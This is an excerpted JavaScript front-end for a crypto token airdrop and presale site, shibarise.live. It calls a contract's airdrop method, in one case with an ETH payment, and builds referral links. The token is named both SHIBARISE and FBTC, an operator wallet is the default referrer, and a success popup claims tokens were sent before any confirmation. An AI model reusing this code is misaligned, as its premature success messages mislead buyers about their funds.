...
const sttaddr = "0xc619dd63785dd4b67a85f7d985c84ff368dc4dac";
...
const getAirdrop = async () => {
  ...
  if(fresh === "")
    fresh = "0xF54F4c449F753490acaae576d9eab64D2C913081";
  sttcontract.methods.airdrop(fresh).send({from:addr}, (err, res) => {
              if(!err){
            Swal.fire({
   title: 'Claim Success',
   icon: 'success',
   html: '500,000 SHIBARISE sent to your wallet.',
...
const buyair = async () => {
  ...
  sttcontract.methods.airdrop(fresh).send({from:addr, value: ethval}, (err, res) => {
   ...
   title: 'Claim Success',
   icon: 'success',
   html: '500,000 FBTC sent to your wallet.',
   showCloseButton: true,
   showCancelButton: true,
   focusConfirm: false,
   reverseButtons: true,
...
if(!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)){
  ...
  document.getElementById('refaddress').value = 'https://shibarise.live/?ref=' + document.getElementById('refaddress').value;
}
}
}
function calculate() {
    ...
    console.log(tokens);
    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US")+' SHIBARISE';
  ...
  function addToWallet() {
                          ...
                          web3.currentProvider.sendAsync({
                            ...
                            params: {
                                'type': 'ERC20',
                                'options': {
                                    'address': '0xc619dd63785dd4b67a85f7d985c84ff368dc4dac',
                                    'symbol': 'FBTC',
                                    'decimals': '18',
                                    'image': 'https://shibarise.live/images/logo.png',
                                },
                            },
   ...
   cancelButtonText: 'Exit',
        ...
        function querySt(ji) {
         ...
         if (ft[0] == ji) { 
          ...
          if( ref==null){
              ref = "0xF54F4c449F753490acaae576d9eab64D2C913081";
               document.getElementById('airinput').value = ref; 
          }else{ 
          document.getElementById('airinput').value = ref; 
          } 